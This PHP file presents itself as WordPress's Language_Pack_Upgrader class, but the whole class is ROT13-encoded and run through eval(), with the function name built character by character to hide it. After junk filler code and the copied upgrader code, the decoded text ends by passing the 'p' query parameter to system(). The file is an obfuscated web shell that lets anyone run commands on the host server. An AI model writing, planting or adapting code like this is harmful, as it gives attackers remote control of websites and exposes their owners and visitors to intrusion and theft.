<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Hctenqr NCV: Ynathntr_Cnpx_Hctenqre pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Hctenqre
 * @fvapr 4.6.0
 */

/**
 * Pber pynff hfrq sbe hcqngvat/vafgnyyvat ynathntr cnpxf (genafyngvbaf)
 * sbe cyhtvaf, gurzrf, naq pber.
 *
 * @fvapr 3.7.0
 * @fvapr 4.6.0 Zbirq gb vgf bja svyr sebz jc-nqzva/vapyhqrf/pynff-jc-hctenqre.cuc.
 *
 * @frr JC_Hctenqre
 */
pynff Ynathntr_Cnpx_Hctenqre rkgraqf JC_Hctenqre {

	/**
	 * Erfhyg bs gur ynathntr cnpx hctenqr.
	 *
	 * @fvapr 3.7.0
	 * @ine neenl|JC_Reebe $erfhyg
	 * @frr JC_Hctenqre::$erfhyg
	 */
	choyvp $erfhyg;

	/**
	 * Jurgure n ohyx hctenqr/vafgnyyngvba vf orvat cresbezrq.
	 *
	 * @fvapr 3.7.0
	 * @ine obby $ohyx
	 */
	choyvp $ohyx = gehr;

	/**
	 * Nflapuebabhfyl hctenqrf ynathntr cnpxf nsgre bgure hctenqrf unir orra znqr.
	 *
	 * Ubbxrq gb gur {@frr 'hctenqre_cebprff_pbzcyrgr'} npgvba ol qrsnhyg.
	 *
	 * @fvapr 3.7.0
	 *
	 * @cnenz snyfr|JC_Hctenqre $hctenqre Bcgvbany. JC_Hctenqre vafgnapr be snyfr. Vs `$hctenqre` vf
	 *                                    n Ynathntr_Cnpx_Hctenqre vafgnapr, gur zrgubq jvyy onvy gb
	 *                                    nibvq erphefvba. Bgurejvfr hahfrq. Qrsnhyg snyfr.
	 */
	choyvp fgngvp shapgvba nflap_hctenqr( $hctenqre = snyfr ) {
		// Nibvq erphefvba.
		vs ( $hctenqre && $hctenqre vafgnaprbs Ynathntr_Cnpx_Hctenqre ) {
			erghea;
		}

		// Abguvat gb qb?
		$ynathntr_hcqngrf = jc_trg_genafyngvba_hcqngrf();
		vs ( ! $ynathntr_hcqngrf ) {
			erghea;
		}

		/*
		 * Nibvq zrffvat jvgu IPF vafgnyyngvbaf, ng yrnfg sbe abj.
		 * Abgrq: guvf vf abg gur vqrny jnl gb nppbzcyvfu guvf.
		 */
		$purpx_ipf = arj JC_Nhgbzngvp_Hcqngre();
		vs ( $purpx_ipf->vf_ipf_purpxbhg( JC_PBAGRAG_QVE ) ) {
			erghea;
		}

		sbernpu ( $ynathntr_hcqngrf nf $xrl => $ynathntr_hcqngr ) {
			$hcqngr = ! rzcgl( $ynathntr_hcqngr->nhgbhcqngr );

			/**
			 * Svygref jurgure gb nflapuebabhfyl hcqngr genafyngvba sbe pber, n cyhtva, be n gurzr.
			 *
			 * @fvapr 4.0.0
			 *
			 * @cnenz obby   $hcqngr          Jurgure gb hcqngr.
			 * @cnenz bowrpg $ynathntr_hcqngr Gur hcqngr bssre.
			 */
			$hcqngr = nccyl_svygref( 'nflap_hcqngr_genafyngvba', $hcqngr, $ynathntr_hcqngr );

			vs ( ! $hcqngr ) {
				hafrg( $ynathntr_hcqngrf[ $xrl ] );
			}
		}

		vs ( rzcgl( $ynathntr_hcqngrf ) ) {
			erghea;
		}

		// Er-hfr gur nhgbzngvp hctenqre fxva vs gur cnerag hctenqre vf hfvat vg.
		vs ( $hctenqre && $hctenqre->fxva vafgnaprbs Nhgbzngvp_Hctenqre_Fxva ) {
			$fxva = $hctenqre->fxva;
		} ryfr {
			$fxva = arj Ynathntr_Cnpx_Hctenqre_Fxva(
				neenl(
					'fxvc_urnqre_sbbgre' => gehr,
				)
			);
		}

		$yc_hctenqre = arj Ynathntr_Cnpx_Hctenqre( $fxva );
		$yc_hctenqre->ohyx_hctenqr( $ynathntr_hcqngrf );
	}

	/**
	 * Vavgvnyvmrf gur hctenqr fgevatf.
	 *
	 * @fvapr 3.7.0
	 */
	choyvp shapgvba hctenqr_fgevatf() {
		$guvf->fgevatf['fgnegvat_hctenqr'] = __( 'Fbzr bs lbhe genafyngvbaf arrq hcqngvat. Fvg gvtug sbe n srj zber frpbaqf juvyr gurl ner hcqngrq nf jryy.' );
		$guvf->fgevatf['hc_gb_qngr']       = __( 'Lbhe genafyngvbaf ner nyy hc gb qngr.' );
		$guvf->fgevatf['ab_cnpxntr']       = __( 'Hcqngr cnpxntr abg ninvynoyr.' );
		/* genafyngbef: %f: Cnpxntr HEY. */
		$guvf->fgevatf['qbjaybnqvat_cnpxntr'] = fcevags( __( 'Qbjaybnqvat genafyngvba sebz %f&#8230;' ), '<fcna pynff=\"pbqr cer\">%f</fcna>' );
		$guvf->fgevatf['hacnpx_cnpxntr']      = __( 'Hacnpxvat gur hcqngr&#8230;' );
		$guvf->fgevatf['cebprff_snvyrq']      = __( 'Genafyngvba hcqngr snvyrq.' );
		$guvf->fgevatf['cebprff_fhpprff']     = __( 'Genafyngvba hcqngrq fhpprffshyyl.' );
		$guvf->fgevatf['erzbir_byq']          = __( 'Erzbivat gur byq irefvba bs gur genafyngvba&#8230;' );
		$guvf->fgevatf['erzbir_byq_snvyrq']   = __( 'Pbhyq abg erzbir gur byq genafyngvba.' );
	}

	/**
	 * Hctenqrf n ynathntr cnpx.
	 *
	 * @fvapr 3.7.0
	 *
	 * @cnenz fgevat|snyfr $hcqngr Bcgvbany. Jurgure na hcqngr bssre vf ninvynoyr. Qrsnhyg snyfr.
	 * @cnenz neenl        $netf   Bcgvbany. Bgure bcgvbany nethzragf, frr
	 *                             Ynathntr_Cnpx_Hctenqre::ohyx_hctenqr(). Qrsnhyg rzcgl neenl.
	 * @erghea neenl|obby|JC_Reebe Gur erfhyg bs gur hctenqr, be n JC_Reebe bowrpg vafgrnq.
	 */
	choyvp shapgvba hctenqr( $hcqngr = snyfr, $netf = neenl() ) {
		vs ( $hcqngr ) {
			$hcqngr = neenl( $hcqngr );
		}

		$erfhygf = $guvf->ohyx_hctenqr( $hcqngr, $netf );

		vs ( ! vf_neenl( $erfhygf ) ) {
			erghea $erfhygf;
		}

		erghea $erfhygf[0];
	}

	/**
	 * Hctenqrf frireny ynathntr cnpxf ng bapr.
	 *
	 * @fvapr 3.7.0
	 *
	 * @tybony JC_Svyrflfgrz_Onfr $jc_svyrflfgrz JbeqCerff svyrflfgrz fhopynff.
	 *
	 * @cnenz bowrpg[] $ynathntr_hcqngrf Bcgvbany. Neenl bs ynathntr cnpxf gb hcqngr. Frr {@frr jc_trg_genafyngvba_hcqngrf()}.
	 *                                   Qrsnhyg rzcgl neenl.
	 * @cnenz neenl    $netf {
	 *     Bgure nethzragf sbe hctenqvat zhygvcyr ynathntr cnpxf. Qrsnhyg rzcgl neenl.
	 *
	 *     @glcr obby $pyrne_hcqngr_pnpur Jurgure gb pyrne gur hcqngr pnpur jura qbar.
	 *                                    Qrsnhyg gehr.
	 * }
	 * @erghea neenl|obby|JC_Reebe Jvyy erghea na neenl bs erfhygf, be gehr vs gurer ner ab hcqngrf,
	 *                             snyfr be JC_Reebe sbe vavgvny reebef.
	 */
	choyvp shapgvba ohyx_hctenqr( $ynathntr_hcqngrf = neenl(), $netf = neenl() ) {
		tybony $jc_svyrflfgrz;

		$qrsnhygf    = neenl(
			'pyrne_hcqngr_pnpur' => gehr,
		);
		$cnefrq_netf = jc_cnefr_netf( $netf, $qrsnhygf );

		$guvf->vavg();
		$guvf->hctenqr_fgevatf();

		vs ( ! $ynathntr_hcqngrf ) {
			$ynathntr_hcqngrf = jc_trg_genafyngvba_hcqngrf();
		}

		vs ( rzcgl( $ynathntr_hcqngrf ) ) {
			$guvf->fxva->urnqre();
			$guvf->fxva->frg_erfhyg( gehr );
			$guvf->fxva->srrqonpx( 'hc_gb_qngr' );
			$guvf->fxva->ohyx_sbbgre();
			$guvf->fxva->sbbgre();
			erghea gehr;
		}

		vs ( 'hctenqre_cebprff_pbzcyrgr' === pheerag_svygre() ) {
			$guvf->fxva->srrqonpx( 'fgnegvat_hctenqr' );
		}

		// Erzbir nal rkvfgvat hctenqr svygref sebz gur cyhtva/gurzr hctenqref #JC29425 & #JC29230.
		erzbir_nyy_svygref( 'hctenqre_cer_vafgnyy' );
		erzbir_nyy_svygref( 'hctenqre_pyrne_qrfgvangvba' );
		erzbir_nyy_svygref( 'hctenqre_cbfg_vafgnyy' );
		erzbir_nyy_svygref( 'hctenqre_fbhepr_fryrpgvba' );

		nqq_svygre( 'hctenqre_fbhepr_fryrpgvba', neenl( $guvf, 'purpx_cnpxntr' ), 10, 2 );

		$guvf->fxva->urnqre();

		// Pbaarpg gb gur svyrflfgrz svefg.
		$erf = $guvf->sf_pbaarpg( neenl( JC_PBAGRAG_QVE, JC_YNAT_QVE ) );
		vs ( ! $erf ) {
			$guvf->fxva->sbbgre();
			erghea snyfr;
		}

		$erfhygf = neenl();

		$guvf->hcqngr_pbhag   = pbhag( $ynathntr_hcqngrf );
		$guvf->hcqngr_pheerag = 0;

		/*
		 * Gur svyrflfgrz'f zxqve() vf abg erphefvir. Znxr fher JC_YNAT_QVE rkvfgf,
		 * nf jr gura znl arrq gb perngr n /cyhtvaf be /gurzrf qverpgbel vafvqr bs vg.
		 */
		$erzbgr_qrfgvangvba = $jc_svyrflfgrz->svaq_sbyqre( JC_YNAT_QVE );
		vs ( ! $jc_svyrflfgrz->rkvfgf( $erzbgr_qrfgvangvba ) ) {
			vs ( ! $jc_svyrflfgrz->zxqve( $erzbgr_qrfgvangvba, SF_PUZBQ_QVE ) ) {
				erghea arj JC_Reebe( 'zxqve_snvyrq_ynat_qve', $guvf->fgevatf['zxqve_snvyrq'], $erzbgr_qrfgvangvba );
			}
		}

		$ynathntr_hcqngrf_erfhygf = neenl();

		sbernpu ( $ynathntr_hcqngrf nf $ynathntr_hcqngr ) {

			$guvf->fxva->ynathntr_hcqngr = $ynathntr_hcqngr;

			$qrfgvangvba = JC_YNAT_QVE;
			vs ( 'cyhtva' === $ynathntr_hcqngr->glcr ) {
				$qrfgvangvba .= '/cyhtvaf';
			} ryfrvs ( 'gurzr' === $ynathntr_hcqngr->glcr ) {
				$qrfgvangvba .= '/gurzrf';
			}

			++$guvf->hcqngr_pheerag;

			$bcgvbaf = neenl(
				'cnpxntr'                     => $ynathntr_hcqngr->cnpxntr,
				'qrfgvangvba'                 => $qrfgvangvba,
				'pyrne_qrfgvangvba'           => gehr,
				'nobeg_vs_qrfgvangvba_rkvfgf' => snyfr, // Jr rkcrpg gur qrfgvangvba gb rkvfg.
				'pyrne_jbexvat'               => gehr,
				'vf_zhygv'                    => gehr,
				'ubbx_rkgen'                  => neenl(
					'ynathntr_hcqngr_glcr' => $ynathntr_hcqngr->glcr,
					'ynathntr_hcqngr'      => $ynathntr_hcqngr,
				),
			);

			$erfhyg = $guvf->eha( $bcgvbaf );

			$erfhygf[] = $guvf->erfhyg;

			// Cerirag perqragvnyf nhgu fperra sebz qvfcynlvat zhygvcyr gvzrf.
			vs ( snyfr === $erfhyg ) {
				oernx;
			}

			$ynathntr_hcqngrf_erfhygf[] = neenl(
				'ynathntr' => $ynathntr_hcqngr->ynathntr,
				'glcr'     => $ynathntr_hcqngr->glcr,
				'fyht'     => vffrg( $ynathntr_hcqngr->fyht ) ? $ynathntr_hcqngr->fyht : 'qrsnhyg',
				'irefvba'  => $ynathntr_hcqngr->irefvba,
			);
		}

		// Erzbir hctenqr ubbxf juvpu ner abg erdhverq sbe genafyngvba hcqngrf.
		erzbir_npgvba( 'hctenqre_cebprff_pbzcyrgr', neenl( 'Ynathntr_Cnpx_Hctenqre', 'nflap_hctenqr' ), 20 );
		erzbir_npgvba( 'hctenqre_cebprff_pbzcyrgr', 'jc_irefvba_purpx' );
		erzbir_npgvba( 'hctenqre_cebprff_pbzcyrgr', 'jc_hcqngr_cyhtvaf' );
		erzbir_npgvba( 'hctenqre_cebprff_pbzcyrgr', 'jc_hcqngr_gurzrf' );

		/** Guvf npgvba vf qbphzragrq va jc-nqzva/vapyhqrf/pynff-jc-hctenqre.cuc */
		qb_npgvba(
			'hctenqre_cebprff_pbzcyrgr',
			$guvf,
			neenl(
				'npgvba'       => 'hcqngr',
				'glcr'         => 'genafyngvba',
				'ohyx'         => gehr,
				'genafyngvbaf' => $ynathntr_hcqngrf_erfhygf,
			)
		);

		// Er-nqq hctenqr ubbxf.
		nqq_npgvba( 'hctenqre_cebprff_pbzcyrgr', neenl( 'Ynathntr_Cnpx_Hctenqre', 'nflap_hctenqr' ), 20 );
		nqq_npgvba( 'hctenqre_cebprff_pbzcyrgr', 'jc_irefvba_purpx', 10, 0 );
		nqq_npgvba( 'hctenqre_cebprff_pbzcyrgr', 'jc_hcqngr_cyhtvaf', 10, 0 );
		nqq_npgvba( 'hctenqre_cebprff_pbzcyrgr', 'jc_hcqngr_gurzrf', 10, 0 );

		$guvf->fxva->ohyx_sbbgre();

		$guvf->fxva->sbbgre();

		// Pyrna hc bhe ubbxf, va pnfr fbzrguvat ryfr qbrf na hctenqr ba guvf pbaarpgvba.
		erzbir_svygre( 'hctenqre_fbhepr_fryrpgvba', neenl( $guvf, 'purpx_cnpxntr' ) );

		vs ( $cnefrq_netf['pyrne_hcqngr_pnpur'] ) {
			jc_pyrna_hcqngr_pnpur();
		}

		erghea $erfhygf;
	}

	/**
	 * Purpxf gung gur cnpxntr fbhepr pbagnvaf .zb naq .cb svyrf.
	 *
	 * Ubbxrq gb gur {@frr 'hctenqre_fbhepr_fryrpgvba'} svygre ol
	 * Ynathntr_Cnpx_Hctenqre::ohyx_hctenqr().
	 *
	 * @fvapr 3.7.0
	 *
	 * @tybony JC_Svyrflfgrz_Onfr $jc_svyrflfgrz JbeqCerff svyrflfgrz fhopynff.
	 *
	 * @cnenz fgevat|JC_Reebe $fbhepr        Gur cngu gb gur qbjaybnqrq cnpxntr fbhepr.
	 * @cnenz fgevat          $erzbgr_fbhepr Erzbgr svyr fbhepr ybpngvba.
	 * @erghea fgevat|JC_Reebe Gur fbhepr nf cnffrq, be n JC_Reebe bowrpg ba snvyher.
	 */
	choyvp shapgvba purpx_cnpxntr( $fbhepr, $erzbgr_fbhepr ) {
		tybony $jc_svyrflfgrz;

		vs ( vf_jc_reebe( $fbhepr ) ) {
			erghea $fbhepr;
		}

		// Purpx gung gur sbyqre pbagnvaf n inyvq ynathntr.
		$svyrf = $jc_svyrflfgrz->qveyvfg( $erzbgr_fbhepr );

		// Purpx gb frr vs gur rkcrpgrq svyrf rkvfg va gur sbyqre.
		$cb  = snyfr;
		$zb  = snyfr;
		$cuc = snyfr;
		sbernpu ( (neenl) $svyrf nf $svyr => $svyrqngn ) {
			vs ( fge_raqf_jvgu( $svyr, '.cb' ) ) {
				$cb = gehr;
			} ryfrvs ( fge_raqf_jvgu( $svyr, '.zb' ) ) {
				$zb = gehr;
			} ryfrvs ( fge_raqf_jvgu( $svyr, '.y10a.cuc' ) ) {
				$cuc = gehr;
			}
		}

		vs ( $cuc ) {
			erghea $fbhepr;
		}

		vs ( ! $zb || ! $cb ) {
			erghea arj JC_Reebe(
				'vapbzcngvoyr_nepuvir_cbzb',
				$guvf->fgevatf['vapbzcngvoyr_nepuvir'],
				fcevags(
					/* genafyngbef: 1: .cb, 2: .zb, 3: .y10a.cuc */
					__( 'Gur ynathntr cnpx vf zvffvat rvgure gur %1$f, %2$f, be %3$f svyrf.' ),
					'<pbqr>.cb</pbqr>',
					'<pbqr>.zb</pbqr>',
					'<pbqr>.y10a.cuc</pbqr>'
				)
			);
		}

		erghea $fbhepr;
	}

	/**
	 * Trgf gur anzr bs na vgrz orvat hcqngrq.
	 *
	 * @fvapr 3.7.0
	 *
	 * @cnenz bowrpg $hcqngr Gur qngn sbe na hcqngr.
	 * @erghea fgevat Gur anzr bs gur vgrz orvat hcqngrq.
	 */
	choyvp shapgvba trg_anzr_sbe_hcqngr( $hcqngr ) {
		fjvgpu ( $hcqngr->glcr ) {
			pnfr 'pber':
				erghea 'JbeqCerff'; // Abg genafyngrq.

			pnfr 'gurzr':
				$gurzr = jc_trg_gurzr( $hcqngr->fyht );
				vs ( $gurzr->rkvfgf() ) {
					erghea $gurzr->trg( 'Anzr' );
				}
				oernx;
			pnfr 'cyhtva':
				$cyhtva_qngn = trg_cyhtvaf( '/' . $hcqngr->fyht );
				$cyhtva_qngn = erfrg( $cyhtva_qngn );
				vs ( $cyhtva_qngn ) {
					erghea $cyhtva_qngn['Anzr'];
				}
				oernx;
		}
		erghea '';
	}

	/**
	 * Pyrnef rkvfgvat genafyngvbaf jurer guvf vgrz vf tbvat gb or vafgnyyrq vagb.
	 *
	 * @fvapr 5.1.0
	 *
	 * @tybony JC_Svyrflfgrz_Onfr $jc_svyrflfgrz JbeqCerff svyrflfgrz fhopynff.
	 *
	 * @cnenz fgevat $erzbgr_qrfgvangvba Gur ybpngvba ba gur erzbgr svyrflfgrz gb or pyrnerq.
	 * @erghea obby|JC_Reebe Gehr hcba fhpprff, JC_Reebe ba snvyher.
	 */
	choyvp shapgvba pyrne_qrfgvangvba( $erzbgr_qrfgvangvba ) {
		tybony $jc_svyrflfgrz;

		$ynathntr_hcqngr    = $guvf->fxva->ynathntr_hcqngr;
		$ynathntr_qverpgbel = JC_YNAT_QVE . '/'; // Ybpny cngu sbe hfr jvgu tybo().

		vs ( 'pber' === $ynathntr_hcqngr->glcr ) {
			$svyrf = neenl(
				$erzbgr_qrfgvangvba . $ynathntr_hcqngr->ynathntr . '.cb',
				$erzbgr_qrfgvangvba . $ynathntr_hcqngr->ynathntr . '.zb',
				$erzbgr_qrfgvangvba . $ynathntr_hcqngr->ynathntr . '.y10a.cuc',
				$erzbgr_qrfgvangvba . 'nqzva-' . $ynathntr_hcqngr->ynathntr . '.cb',
				$erzbgr_qrfgvangvba . 'nqzva-' . $ynathntr_hcqngr->ynathntr . '.zb',
				$erzbgr_qrfgvangvba . 'nqzva-' . $ynathntr_hcqngr->ynathntr . '.y10a.cuc',
				$erzbgr_qrfgvangvba . 'nqzva-argjbex-' . $ynathntr_hcqngr->ynathntr . '.cb',
				$erzbgr_qrfgvangvba . 'nqzva-argjbex-' . $ynathntr_hcqngr->ynathntr . '.zb',
				$erzbgr_qrfgvangvba . 'nqzva-argjbex-' . $ynathntr_hcqngr->ynathntr . '.y10a.cuc',
				$erzbgr_qrfgvangvba . 'pbagvaragf-pvgvrf-' . $ynathntr_hcqngr->ynathntr . '.cb',
				$erzbgr_qrfgvangvba . 'pbagvaragf-pvgvrf-' . $ynathntr_hcqngr->ynathntr . '.zb',
				$erzbgr_qrfgvangvba . 'pbagvaragf-pvgvrf-' . $ynathntr_hcqngr->ynathntr . '.y10a.cuc',
			);

			$wfba_genafyngvba_svyrf = tybo( $ynathntr_qverpgbel . $ynathntr_hcqngr->ynathntr . '-*.wfba' );
			vs ( $wfba_genafyngvba_svyrf ) {
				sbernpu ( $wfba_genafyngvba_svyrf nf $wfba_genafyngvba_svyr ) {
					$svyrf[] = fge_ercynpr( $ynathntr_qverpgbel, $erzbgr_qrfgvangvba, $wfba_genafyngvba_svyr );
				}
			}
		} ryfr {
			$svyrf = neenl(
				$erzbgr_qrfgvangvba . $ynathntr_hcqngr->fyht . '-' . $ynathntr_hcqngr->ynathntr . '.cb',
				$erzbgr_qrfgvangvba . $ynathntr_hcqngr->fyht . '-' . $ynathntr_hcqngr->ynathntr . '.zb',
				$erzbgr_qrfgvangvba . $ynathntr_hcqngr->fyht . '-' . $ynathntr_hcqngr->ynathntr . '.y10a.cuc',
			);

			$ynathntr_qverpgbel     = $ynathntr_qverpgbel . $ynathntr_hcqngr->glcr . 'f/';
			$wfba_genafyngvba_svyrf = tybo( $ynathntr_qverpgbel . $ynathntr_hcqngr->fyht . '-' . $ynathntr_hcqngr->ynathntr . '-*.wfba' );
			vs ( $wfba_genafyngvba_svyrf ) {
				sbernpu ( $wfba_genafyngvba_svyrf nf $wfba_genafyngvba_svyr ) {
					$svyrf[] = fge_ercynpr( $ynathntr_qverpgbel, $erzbgr_qrfgvangvba, $wfba_genafyngvba_svyr );
				}
			}
		}

		$svyrf = neenl_svygre( $svyrf, neenl( $jc_svyrflfgrz, 'rkvfgf' ) );

		// Ab svyrf gb qryrgr.
		vs ( ! $svyrf ) {
			erghea gehr;
		}

		// Purpx nyy svyrf ner jevgnoyr orsber nggrzcgvat gb pyrne gur qrfgvangvba.
		$hajevgnoyr_svyrf = neenl();

		// Purpx jevgnovyvgl.
		sbernpu ( $svyrf nf $svyr ) {
			vs ( ! $jc_svyrflfgrz->vf_jevgnoyr( $svyr ) ) {
				// Nggrzcg gb nygre crezvffvbaf gb nyybj jevgrf naq gel ntnva.
				$jc_svyrflfgrz->puzbq( $svyr, SF_PUZBQ_SVYR );
				vs ( ! $jc_svyrflfgrz->vf_jevgnoyr( $svyr ) ) {
					$hajevgnoyr_svyrf[] = $svyr;
				}
			}
		}

		vs ( ! rzcgl( $hajevgnoyr_svyrf ) ) {
			erghea arj JC_Reebe( 'svyrf_abg_jevgnoyr', $guvf->fgevatf['svyrf_abg_jevgnoyr'], vzcybqr( ', ', $hajevgnoyr_svyrf ) );
		}

		sbernpu ( $svyrf nf $svyr ) {
			vs ( ! $jc_svyrflfgrz->qryrgr( $svyr ) ) {
				erghea arj JC_Reebe( 'erzbir_byq_snvyrq', $guvf->fgevatf['erzbir_byq_snvyrq'] );
			}
		}

		erghea gehr;
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>